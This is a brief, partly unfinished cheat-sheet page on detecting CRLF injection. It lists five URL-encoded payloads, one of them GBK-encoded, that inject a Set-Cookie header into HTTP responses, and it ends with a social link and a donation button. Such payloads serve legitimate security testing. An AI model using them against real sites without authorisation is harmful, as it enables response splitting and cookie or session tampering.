# CRLF - General Detection

### Description
details
</br>&nbsp;

## Sub Techniques
### 1. Noraml Payloads
- Aplicable to CR
```
%0D%0A%20Set-Cookie:whoami=meashacker
%20%0D%0ASet-Cookie:whoami=meashacker
%0A%20Set-Cookie:whoami=meashacker
%2F%2E%2E%0D%0ASet-Cookie:whoami=meashacker
```
### 2. GBK Encoding
- Aplicable to CR
```
%E5%98%8D%E5%98%8ASet-Cookie:whoami=meashacker
```

<br>&nbsp;
## References:
[Reference](ref)</br>

<br>&nbsp;
## Support
You can Follow [me](https://twitter.com/MeAsHacker_HNA) on twitter or
<br><br><a href="https://www.buymeacoffee.com/NafisiAslH" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
